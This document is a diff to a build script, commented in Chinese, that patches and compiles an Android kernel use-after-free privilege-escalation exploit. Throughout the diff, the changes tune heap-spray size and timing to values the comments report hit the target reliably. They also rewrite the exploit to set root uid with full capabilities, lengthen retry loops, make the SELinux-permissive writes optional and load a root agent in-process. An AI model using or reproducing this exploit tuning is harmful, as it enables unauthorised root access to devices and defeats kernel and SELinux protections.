@@ -21,6 +21,10 @@ LINK_BOOTID=$(get link_bootid)
 CRED_SITE=$(get cred_site_low21)
 BLOB_A=$(get blob_site_a)
 BLOB_B=$(get blob_site_b)
+SPRAY_N=$(get spray_n)
+SPREAD_MS=$(get spread_ms)
+SPRAY_N=${SPRAY_N:-4096}
+SPREAD_MS=${SPREAD_MS:-50}
 
 for v in REPO COMMIT URL WANT_SIZE WANT_SHA LINK_ADD_WORKER LINK_SELINUX LINK_BOOTID CRED_SITE; do
   if [ -z "${!v}" ]; then
@@ -53,7 +57,7 @@ fi
 T="$SRC/tools"
 [ -f "$T/ctest.c" ] || { echo "::error::tarball 结构异常：缺 tools/ctest.c"; exit 1; }
 
-# —— 常量注入（表驱动：每项都必须命中）——
+# —— 常量注入 ——
 patch_macro() {
   local file=$1 name=$2 value=$3
   if ! grep -qE "^#define[[:space:]]+$name[[:space:]]" "$file"; then
@@ -78,16 +82,17 @@ patch_macro "$T/ctest.c" BLOB_SITE_A "$BLOB_A"
 patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
 grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'
 
-# —— 策略补丁 ——
-# 默认路径（不设 C99491_PERMISSIVE）完全不写 selinux_state：
-# 实测在 Enforcing 下往 selinux_state 写会卡死设备。
-python3 - "$T/ctest.c" <<'PY'
+# —— 策略补丁（ctest.c + uaf_write.inc）——
+# 关键：uaf_write_once 原本用不留间隔的 spray_fire，实测 spray=4096/spread=50
+# 时 kprobe 显示 vals 恒等于目标（4/4 命中），默认 1024/0 则全部 miss。
+python3 - "$T/ctest.c" "$T/uaf_write.inc" "${CVE99491_SPRAY_N:-$SPRAY_N}" "${SPREAD_MS}" <<'PY'
 import io
 import re
 import sys
 
-path = sys.argv[1]
-src = io.open(path, encoding="utf-8").read()
+ctest_path, inc_path, spray_n, spread_ms = sys.argv[1:5]
+c = io.open(ctest_path, encoding="utf-8").read()
+u = io.open(inc_path, encoding="utf-8").read()
 
 def sub_n(text, old, new, what, want):
     n = text.count(old)
@@ -95,63 +100,66 @@ def sub_n(text, old, new, what, want):
         raise SystemExit("补丁失败：%s 期望 %d 次，实际 %d 次" % (what, want, n))
     return text.replace(old, new)
 
-# 1) uid/euid/fsuid 一起改 0，并补全能力位
-src = sub_n(
-    src,
+# ---- uaf_write.inc：让单次写带间隔，并延长上报后的等待 ----
+u = sub_n(
+    u,
+    "spray_fire(spray_n, spray_buf);",
+    "spray_spread(spray_n, %s, spray_buf);" % spread_ms,
+    "uaf_write_once 改用 spray_spread",
+    1,
+)
+u = sub_n(u, "usleep(40000);", "usleep(150000);", "上报后等待 150ms", 1)
+
+# ---- ctest.c：默认 spray 数改为实测命中值 ----
+c = sub_n(c, "long spray = 1024;", "long spray = %s;" % spray_n, "spray 默认值", 2)
+
+# ---- ctest.c 其余策略补丁 ----
+c = sub_n(
+    c,
     "    patch_agent(pid, cred, 0, 1);\n",
     "    patch_agent(pid, cred, 1, 1);\n    patch_full_caps(pid, cred);\n",
     "chain_fast 改 root + patch_full_caps",
     1,
 )
-
-# 2) patch_agent 重试轮数 10 -> 40（实测 10 轮内经常全 miss）
-src = sub_n(
-    src,
+c = sub_n(
+    c,
     "    for (int r = 0; r < 10; r++) {\n        long t0 = now_ms();\n",
     "    for (int r = 0; r < 40; r++) {\n        long t0 = now_ms();\n",
     "patch_agent 轮数 40",
     1,
 )
-
-# 3) permissive 只在显式要求时尝试
-src = sub_n(
-    src,
+c = sub_n(
+    c,
     "    if (try_permissive(st) < 0) {",
     "    if (getenv(\"C99491_PERMISSIVE\") && try_permissive(st) < 0) {",
     "try_permissive 条件化",
     2,
 )
-
-# 4) initialized 写同样关掉（两处缩进不同：8 与 12）
-src, n = re.subn(
+c, n = re.subn(
     r"uaf_write_once\(st \+ 1, 1024, 0\);",
     "if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, 1024, 0);",
-    src,
+    c,
 )
 if n != 2:
     raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
-
-# 5) 装载方式：不再让 agent 走 loadksu（需要一加的符号表），
-#    也不经 shell（mksh 会降 euid）。改为进程内由 c99491_agent 自己加载。
-src = sub_n(
-    src,
+c = sub_n(
+    c,
     "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
     "        int n = snprintf(c, sizeof(c), \"id\\n\");",
-    "loadksu -> id（真正的加载在 c99491_agent 里原地完成）",
+    "loadksu -> id",
     2,
 )
-
-# 6) caps 修补轮数 12 -> 40
-src = sub_n(
-    src,
+c = sub_n(
+    c,
     "for (int r = 0; r < 12 && !(li && lp && lb && la); r++)",
     "for (int r = 0; r < 40 && !(li && lp && lb && la); r++)",
     "caps 轮数 40",
     1,
 )
 
-io.open(path, "w", encoding="utf-8").write(src)
-print("策略补丁已应用：root+caps(40轮) / 不写 selinux_state / 进程内加载")
+io.open(ctest_path, "w", encoding="utf-8").write(c)
+io.open(inc_path, "w", encoding="utf-8").write(u)
+print("策略补丁已应用：spray=%s spread=%s / root+caps(40轮) / 不写 selinux_state" % (spray_n, spread_ms))
 PY
 
 # —— Android system_properties 垫片 ——
@@ -214,7 +222,9 @@ build tinycred      "$T/tinycred.c"
   echo "cred_site_low21=$CRED_SITE"
   echo "blob_site_a=$BLOB_A"
   echo "blob_site_b=$BLOB_B"
-  echo "patches=root+caps40,patch_agent40,no-selinux-write,inprocess-finit"
+  echo "spray_n=$spray_n"
+  echo "spread_ms=$SPREAD_MS"
+  echo "patches=spray-spread,root+caps40,patch_agent40,no-selinux-write,inprocess-finit"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
